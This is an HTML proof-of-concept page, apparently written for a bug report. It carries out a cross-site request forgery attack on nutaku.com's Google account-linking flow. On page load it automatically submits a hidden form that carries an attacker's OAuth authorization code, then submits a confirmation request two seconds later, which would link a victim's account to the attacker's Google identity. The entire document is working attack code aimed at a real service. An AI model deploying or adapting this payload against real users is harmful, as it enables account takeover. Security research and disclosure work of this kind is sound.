<!DOCTYPE html>
<html>
  <head>
    <title>CSRF PoC Nutaku - Google Link</title>
  </head>
  <body>
    <h2>CSRF PoC Nutaku</h2>

    <!-- Formulário 1: /link/google/callback/ -->
    <form id="callbackForm" method="GET" action="https://www.nutaku.com/link/google/callback/">
      <input type="hidden" name="state" value="link">
      <input type="hidden" name="code" value="4/0AVMBsJgABSdvkrxM7VONE2SVc1MF3thu-n15yw4BlFP5JMeGdLnaMFxX2N5E__ouidk_3Q">
      <input type="hidden" name="scope" value="email profile https://www.googleapis.com/auth/userinfo.profile https://www.googleapis.com/auth/userinfo.email openid">
      <input type="hidden" name="authuser" value="3">
      <input type="hidden" name="prompt" value="none">
    </form>

    <!-- Formulário 2: /link/google/confirmation/ -->
    <form id="confirmForm" method="GET" action="https://www.nutaku.com/link/google/confirmation/">
    </form>

    <script>
      // Submete o primeiro formulário (callback)
      document.getElementById('callbackForm').submit();

      // Espera 2 segundos, então submete o segundo (confirmação)
      setTimeout(function() {
        document.getElementById('confirmForm').submit();
      }, 2000);
    </script>
  </body>
</html>
